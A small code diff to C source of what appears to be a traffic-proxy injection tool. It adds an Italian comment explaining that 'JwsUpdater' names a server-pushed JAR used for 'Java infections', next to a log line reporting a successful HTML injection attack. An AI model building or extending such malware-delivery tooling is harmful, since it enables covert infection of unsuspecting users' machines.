@@ -146,6 +146,11 @@ int proxy_replace(BIO **cbio, BIO **sbio, char *file,  char *tag, char *host, ch
 
    SAFE_FREE(path);
 
+   /*
+    * JwsUpdater indica il nome utilizzato dal file /opt/td-config/share/vectors/JwsUpdater?.jar
+    * per le infezioni Java. Poiche' il file viene pushato dal server, se cambia il nome del file
+    * lato server, allora e' necessario cambiare anche questo.
+    */
    if (strstr(file, "JwsUpdater"))
       DEBUG_MSG(D_INFO, "[%s] Inject HTML attack successful", ip);
    else
